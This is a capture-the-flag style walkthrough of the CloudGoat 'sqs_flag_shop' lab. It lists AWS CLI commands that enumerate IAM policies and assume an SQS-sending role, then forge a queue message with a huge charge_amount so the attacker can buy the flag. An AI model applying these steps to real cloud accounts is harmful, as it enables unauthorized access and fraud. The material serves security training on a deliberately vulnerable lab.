  
1. The attacker accesses the web page and identifies the features first

    [ page ] → what can do  
    /        → User can buy items.  
    /receipt → User can see the purchase.  
    /charge  → User can charge the cash.  
  
---

2. The attacker checks the privileges it has
    ```bash
    # Configure AWS CLI settings for a specific profile, allowing you to set credentials
    aws configure --profile [profile_name]
   
    # Get the ARN & full name of user.
    aws --profile [profile_name] sts get-caller-identity
   
    # List policies attached to user.
    aws --profile [profile_name] iam list-user-policies --user-name [user_name]
   
    # View permissions granted to inline policies.
    aws --profile [profile_name] iam get-user-policy --user-name [user_name] --policy-name [policy_name]
    
   # View inline policies granted to role.
    aws --profile [profile_name] iam list-role-policies --role-name [role_name]
    
   # View permissions granted to inline policies.
    aws --profile [profile_name] iam get-role-policy --role-name [role_name] --policy-name [policy_name]
    ```  
    ※ Attacker finds that they have assume-role privileges for a particular role.  
    ※ Attacker looks for clues about how to attack using this privilege.
   
---  

3. Find the web source code. By analyzing the source code, the attacker checks the format of message sent to the SQS service
  
    ※ The website has a github address exposed as an annotation.  
    → https://github.com/RhinoSecurityLabs/cloudgoat/scenarios/sqs_flag_shop/terraform/source/flask
  
    < Code Analysis Results >  
  -When charging the cash, a message is sent to the SQS service.  
  -The lambda function does not verify the received message.  
  -The message format is `{"charge_amount" : cash}`  
  
    ※ Attacker plans to forge the cache and send message to the SQS service.  
  
---  

4. Assume the the sending message role about SQS service
    ```bash
    # Get credentials for the role about sending messages to SQS queue.
    aws --profile [profile_user] sts assume-role --role-arn [role_arn] --role-session-name [whatever_you_want_here]
    
   # Configure AWS profile.
    aws configure --profile [assumed_profile_name]
    
   # Set the session token to ~/.aws/credentials.
    echo "aws_session_token = {token}" >> ~/.aws/credentials
    ```  
  
---  
  
5. The attacker, who possesses the necessary permissions, sends a forged message to the SQS service queue  
    ```bash
    # Get queue-url of SQS service
    aws --profile [assumed_profile_name] sqs get-queue-url --queue-name cash_charging_queue
    
   # Send a forged message to the SQS service queue
    aws --profile [assumed_profile_name] sqs send-message --queue-url [queue_url] --message-body '{"charge_amount": 100000000}'
    ```  
  
---  
  
6. Check the changed assets, purchase FLAG and check the secret-string
